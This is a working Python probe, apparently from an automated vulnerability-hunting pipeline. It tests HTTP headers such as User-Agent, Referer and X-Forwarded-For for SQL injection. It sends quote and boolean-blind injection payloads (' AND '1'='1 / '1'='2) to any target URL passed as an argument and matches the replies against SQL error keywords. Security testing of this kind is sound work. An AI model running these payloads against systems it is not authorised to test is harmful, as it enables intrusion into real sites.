#!/usr/bin/env python3
"""Generic header-sink SQLi probe for an UNKNOWN header sink (Rule #91).

Query sinks test SQLi via ?params (Rule #57), JSON sinks via body
fields (Rule #84), cookies via cookie values (Rule #89) — but request
HEADERS fed to SQL (User-Agent / Referer / X-Forwarded-For written
raw into analytics, logging, or "recent visitors" tables: a real
human hunter tampers their UA too) are a sink KIND the loop never
SQLi-tests. This probe takes the sink spec from its marker argv:

    MARKER = PLOOP91|<target_base>|<path>|GET|<header_csv>

GET-only (header sinks are read requests, the Rule #82 plan
discipline). Header names are validated up front
([A-Za-z0-9-]{1,40}, the Rule #82 regex) — one bad name fails the
whole probe closed. The header under test carries the payload value;
every other header (in the CSV and the default trio) keeps its benign
value, so the request shape stays constant (first CONFIRMED wins,
the Rule #80 pattern).

Flow per header (stdlib only):
  1. Sink page must answer 200/302 (read-only, benign values).
  2. STABILITY GATE: two identical benign requests must match
     byte-exact; a dynamic page skips the header (Rule #55 — never
     ground a claim on noise).
  3. ERROR TEST: append a lone quote to the benign value. SQL error
     keywords present in the quote response AND ABSENT from the benign
     response -> CONFIRMED (error-based SQLi).
  4. BOOLEAN-BLIND TEST: value' AND '1'='1 (true) vs
     value' AND '1'='2 (false). Grounding requires BOTH: the true body
     equals the benign body, AND the false body differs from the true
     body on TWO repeats. Differential == blind SQLi -> CONFIRMED.

The benign value is run-unique (benign91-<nonce>, printed as RUN_NONCE)
so the Rule #81 wrapper re-run injects a DIFFERENT value — both
confirmations prove repeat injection, never one stale row. HTTP 500
bodies are read (keywords live on error pages); redirects are NOT
followed.

Fail-closed: bad marker / non-GET method / bad header name abort; the
control request can never confirm; errors, timeouts -> FAILED. A
verbatim quote echo without error keywords or a blind differential
can never confirm.

Evidence vocabulary (Rule #73) mirrors probe_sink_sqli.py's shape
(header= instead of param=) so the claim layer reads the same class:
future module generic_headersqli, class sql_injection (distinct module
from generic_sqli — dedup is (module, class, location), the Rule #69
rationale).

One self-contained reproducible command, fixed marker from argv, own
VERDICT line. Any exception -> PROBE_ERROR + VERDICT: FAILED.
"""
import hashlib
import http.client
import os
import re
import sys
import urllib.parse

REQ_TIMEOUT = 15
_HDR_RE = re.compile(r"[A-Za-z0-9-]{1,40}\Z")
DEFAULT_HEADERS = ("User-Agent", "Referer", "X-Forwarded-For")

ERROR_KEYWORDS = (
    "you have an error in your sql syntax",
    "warning: mysql", "mysqli", "mysql_fetch", "mysql_num_rows",
    "sqlite", "sqlite3", "pg_query", "postgresql", "unterminated",
    "odbc", "jdbc", "mssql", "sql server", "oracle error", "ora-",
    "sqlstate", "syntax error near",
)


def _raw_get(tb, path, headers):
    """GET without following redirects. Returns (code, body)."""
    pu = urllib.parse.urlparse(tb.rstrip("/") + path)
    host, port = pu.hostname, pu.port
    use_ssl = pu.scheme == "https"
    conn_cls = (http.client.HTTPSConnection if use_ssl
                else http.client.HTTPConnection)
    conn = conn_cls(host, port or (443 if use_ssl else 80),
                    timeout=REQ_TIMEOUT)
    try:
        conn.request("GET", pu.path, headers=headers)
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body
    finally:
        conn.close()


def _digest(body):
    return hashlib.sha256(body.encode()).hexdigest()[:16]


def _error_hits(body):
    bl = body.lower()
    return [k for k in ERROR_KEYWORDS if k in bl]


def main():
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP91"
    try:
        _, tb_q, path_q, method, headers_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    method = (method or "GET").upper()
    names = [h.strip() for h in (headers_csv or "").split(",") if h.strip()]
    if not tb or not path.startswith("/") or method != "GET" or not names:
        print("PROBE_ERROR invalid sink spec "
              "(header-SQLi needs a GET path sink + header names)")
        print("VERDICT: FAILED")
        return
    for n in names:
        if not _HDR_RE.match(n):
            print("PROBE_ERROR invalid header name %r (fail-closed: no "
                  "header-syntax injection via the marker)" % n)
            print("VERDICT: FAILED")
            return
    nonce = os.urandom(4).hex()
    benign = "benign91-%s" % nonce
    print("EVIDENCE sink=%s marker=%s" % (path, marker))
    print("RUN_NONCE %s" % nonce)

    confirmed_header = None
    evidence = []

    def hdrs(under_test, value):
        # Every request carries the full default trio; the header
        # under test gets the payload, everything else stays benign
        # so only one variable changes per request.
        out = {"User-Agent": "PLOOP91-benign",
               "Referer": "http://localhost/benign",
               "X-Forwarded-For": "127.0.0.1"}
        for n in names:
            if n not in out:
                out[n] = "PLOOP91-benign"
        out[under_test] = value
        return out

    for name in names:
        # 1. sink page must answer (read-only, benign values).
        try:
            code, _ = _raw_get(tb, path, hdrs(name, benign))
        except Exception as exc:
            print("PROBE_ERROR header %s sink request failed: %s"
                  % (name, exc))
            continue
        if code not in (200, 302):
            print("PROBE_ERROR header %s sink page status %s"
                  % (name, code))
            continue

        # 2. STABILITY GATE: identical benign request twice.
        try:
            b1 = _raw_get(tb, path, hdrs(name, benign))[1]
            b2 = _raw_get(tb, path, hdrs(name, benign))[1]
        except Exception as exc:
            print("PROBE_ERROR header %s benign fetch failed: %s"
                  % (name, exc))
            continue
        if b1 != b2:
            print("HEADER %s: skipped (dynamic page, baseline unstable "
                  "-- no claim grounded)" % name)
            continue
        benign_errors = _error_hits(b1)
        bdigest = _digest(b1)

        # 3. ERROR TEST: a lone quote must introduce SQL error keywords
        #    that the benign page does NOT have.
        try:
            qbody = _raw_get(tb, path, hdrs(name, benign + "'"))[1]
        except Exception as exc:
            print("PROBE_ERROR header %s quote fetch failed: %s"
                  % (name, exc))
            continue
        qhits = [k for k in _error_hits(qbody) if k not in benign_errors]
        if qhits and qbody != b1:
            print("EVIDENCE sink=%s header=%s error_based hits=%s "
                  "digest=%s" % (path, name, ",".join(qhits[:3]),
                                 _digest(qbody)))
            confirmed_header = name
            evidence.append("error_based")
            break

        # 4. BOOLEAN-BLIND TEST: true-branch must match benign, false
        #    branch must differ — on two repeats.
        true_v = benign + "' AND '1'='1"
        false_v = benign + "' AND '1'='2"
        try:
            t1 = _raw_get(tb, path, hdrs(name, true_v))[1]
            f1 = _raw_get(tb, path, hdrs(name, false_v))[1]
            t2 = _raw_get(tb, path, hdrs(name, true_v))[1]
            f2 = _raw_get(tb, path, hdrs(name, false_v))[1]
        except Exception as exc:
            print("PROBE_ERROR header %s blind fetch failed: %s"
                  % (name, exc))
            continue
        if t1 == t2 and f1 == f2 and t1 == b1 and f1 != t1:
            print("EVIDENCE sink=%s header=%s boolean_blind "
                  "true_digest=%s false_digest=%s benign_digest=%s "
                  "(repeats consistent)" % (path, name, _digest(t1),
                                            _digest(f1), bdigest))
            confirmed_header = name
            evidence.append("boolean_blind")
            break
        print("HEADER %s: not injectable (no error keywords, no stable "
              "true/false differential)" % name)

    if confirmed_header and evidence:
        print("EVIDENCE class=sql_injection via=%s" % "+".join(evidence))
        print("VERDICT: CONFIRMED")
    else:
        print("VERDICT: FAILED")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print("PROBE_ERROR: %s" % exc)
        print("VERDICT: FAILED")
